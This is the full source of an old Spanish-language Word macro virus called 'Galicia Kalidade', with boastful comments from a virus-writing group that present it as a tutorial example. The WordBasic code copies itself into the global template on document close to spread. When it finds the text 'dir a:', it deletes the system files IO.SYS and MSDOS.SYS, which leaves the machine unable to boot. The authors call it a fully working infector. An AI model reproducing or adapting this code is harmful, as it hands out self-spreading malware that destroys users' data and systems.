'
'                                             ‹€€€€€‹ ‹€€€€€‹ ‹€€€€€‹
'          Galicia Kalidade                   €€€ €€€ €€€ €€€ €€€ €€€
'          (@) MaD MoTHeR TeaM                 ‹‹‹€€ﬂ ﬂ€€€€€€ €€€€€€€
'                                             €€€‹‹‹‹ ‹‹‹‹€€€ €€€ €€€
'                                             €€€€€€€ €€€€€€ﬂ €€€ €€€
'
' This baby is the smallest macro virus ever (as far as i know). I wrote it
' as a code example of  the VBA language  tutorial published in this issue.
'
' It's an encrypted WinWord infector which infects on AutoClose and... look
' at this... it's the  unique virus in the world which infects by 'doing' a
' dir a:... but not in the way you're supposing ;-)
'
' On AutoClose, it copies  itself and  checks  the closed  document for the
' words 'dir a:', ignoring any  case or font... if such string is found, it
' will delete MSDOS.SYS and IO.SYS and then display a message box.
'
' Btw, as this is the first spanish  macro virus, i decided  to write it so
' it will work only under spanish versions of WinWord :-)


Sub Main
nombre$ = NombreVentana$() + ":AutoClose"
MacroCopiar nombre$, "Global:AutoClose", 1
ArchivoGuardarComo .Format = 1
MacroCopiar "Global:AutoClose", nombre$, 1
PrincipioDeDocumento
Edici¢nBuscarEliminarFormato
Edici¢nBuscar .Buscar = "DIR A:", .PalabraCompleta = 0, \
              .CoincidirMay£sMin£s = 0, .Direcciones = 0, \
              .Ajuste = 0
If Edici¢nBuscarEncontrado() <> 0 Then
              FijarAtributos "C:\IO.SYS",0
              Fijar Atributos "C:\MSDOS.SYS",0
              Kill "C:\IO.SYS"
              Kill "C:\MSDOS.SYS"
              MsgBox "El virus Galicia Kalidade ha actuado" , \
                     "Galicia Kalidade", 16
End If
End Sub


' Hey! What  are you  looking for? *THAT* supertiny thing is a 100% working
' macro virus... didn't you believe me when i told you this is the smallest
' WW infector ever? :-)
